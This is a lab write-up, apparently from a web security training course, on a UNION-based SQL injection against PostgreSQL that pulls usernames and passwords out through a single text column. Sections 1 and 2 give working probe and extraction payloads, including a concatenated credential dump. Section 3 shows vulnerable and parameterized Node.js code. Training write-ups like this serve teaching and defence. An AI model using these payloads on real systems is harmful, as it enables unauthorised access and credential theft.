# Lab: SQL injection UNION attack, retrieving multiple values in a single column

## 1. Vulnerability Discovery & Data Type Enumeration (The Analysis)
* **Target Endpoint / Parameter:** `/filter?category=xyz`
* **Vulnerability Type:** Server-Side (SQL Injection - UNION Based)
* **Target Database Infrastructure:** PostgreSQL

### Step 1: Mapping Column Count via Structural Ordering
Using the `ORDER BY` clause, I mapped the active query layout boundary:
* `category=xyz' ORDER BY 2-- ` -> HTTP 200 OK
* `category=xyz' ORDER BY 3-- ` -> HTTP 500 Internal Server Error

**Deduction:** The database query architecture expects exactly **2 columns**.

### Step 2: Isolating Text Compatibility Constraints
Because attempting a standard multi-column string extraction (`username, password`) threw immediate runtime execution/routing failures, I sequentially tested each column slot to isolate schema type permissions:
* **Testing Slot 1:** `category=xyz' UNION SELECT 'a', NULL-- ` -> HTTP 500 Internal Server Error
  * *Deduction:* Slot 1 enforces strict non-string type constraints (e.g., product integers/prices).
* **Testing Slot 2:** `category=xyz' UNION SELECT NULL, 'a'-- ` -> HTTP 200 OK
  * *Deduction:* Slot 2 is the single column that natively processes text string payloads.

## 2. Exploitation & Data Exfiltration (The Hack)
* **The Constraint Strategy:** To bypass the 1-column string limitation, I utilized PostgreSQL's native string concatenation operator (`||`) to fold multiple application security columns (`username` and `password`) into a single output field. I inserted a delimiter character (`~`) to differentiate the datasets at runtime.
* **Payload Used:** `' UNION SELECT NULL, username || '~' || password FROM users-- `
* **Full URL Encoded Input:** `/filter?category=xyz'+UNION+SELECT+NULL,+username||'~'||password+FROM+users--+`
* **Mechanism:**
  1. Setting the category to a dummy input (`xyz`) forces the core lookup to yield zero rows, ensuring only our injected data fields iterate into the UI template elements.
  2. The payload respects the integer type restriction of slot one by passing a blank `NULL`, while feeding the combined credential text directly into slot two.
  3. The comment syntax (`-- `) drops trailing database filters to prevent formatting compiler crashes.
* **Result:** The server dumped the composite credential records directly into the public webpage layout, enabling the successful retrieval of the administrative password string.

## 3. Remediation (The Fix)
* **Flawed Concept:** Appending unvalidated client parameter strings directly into structural database execution sequences.
* **The Correction:** Secure the backend architecture by refactoring database connection functions to use **Prepared Statements (Parameterized Queries)** with strict type binding.

### Vulnerable Code Example (Conceptual Node.js/PostgreSQL Context)
```javascript
const category = req.query.category;
// Vulnerable: Variable interpolation allows runtime SQL structure manipulation
const query = `SELECT id, name FROM products WHERE category = '${category}'`;
db.query(query);
```

### Secure Remediation Example (Parameterized Validation)
```javascript
const category = req.query.category;
// Secure: Separation ensures the input is strictly validated as data, never parsed as code logic
const query = 'SELECT id, name FROM products WHERE category = \$1';
db.query(query, [category]);
```
